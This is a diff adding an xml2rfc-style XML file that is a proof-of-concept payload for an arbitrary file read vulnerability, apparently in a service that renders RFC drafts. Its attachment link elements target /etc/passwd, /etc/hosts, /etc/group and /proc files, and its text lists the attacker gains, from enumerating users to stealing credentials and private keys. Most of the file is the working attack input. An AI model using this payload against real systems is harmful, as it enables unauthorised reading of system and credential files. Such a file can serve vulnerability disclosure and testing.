@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
+<rfc version="3" ipr="trust200902" docName="draft-poc-multifile-00" category="info" submissionType="IETF">
+  <!-- 尝试读取多个敏感文件 -->
+  <link rel="attachment" href="/etc/passwd"/>
+  <link rel="attachment" href="/etc/hosts"/>
+  <link rel="attachment" href="/etc/group"/>
+  <link rel="attachment" href="/proc/version"/>
+  <link rel="attachment" href="/proc/cpuinfo"/>
+  <front>
+    <title>POC: Reading Multiple System Files</title>
+    <author fullname="Security Researcher" initials="S." surname="Researcher">
+      <organization>Security Research Lab</organization>
+      <address>
+        <email>security@example.com</email>
+      </address>
+    </author>
+    <date year="2025" month="November" day="22"/>
+    <abstract>
+      <t>This POC demonstrates reading multiple system files simultaneously 
+      using the arbitrary file read vulnerability.</t>
+    </abstract>
+  </front>
+  <middle>
+    <section anchor="intro">
+      <name>Introduction</name>
+      <t>This proof of concept shows that multiple files can be read in a single request.</t>
+    </section>
+    <section anchor="files">
+      <name>Targeted Files</name>
+      <t>The following files are targeted in this POC:</t>
+      <ul>
+        <li>/etc/passwd - System user accounts</li>
+        <li>/etc/hosts - Host name mappings</li>
+        <li>/etc/group - Group information</li>
+        <li>/proc/version - Kernel version</li>
+        <li>/proc/cpuinfo - CPU information</li>
+      </ul>
+    </section>
+    <section anchor="impact">
+      <name>Security Impact</name>
+      <t>An attacker can use this vulnerability to:</t>
+      <ul>
+        <li>Enumerate system users and services</li>
+        <li>Gather system configuration information</li>
+        <li>Read application configuration files containing credentials</li>
+        <li>Access private keys and certificates</li>
+        <li>Steal sensitive business data</li>
+      </ul>
+    </section>
+  </middle>
+  <back/>
+</rfc>
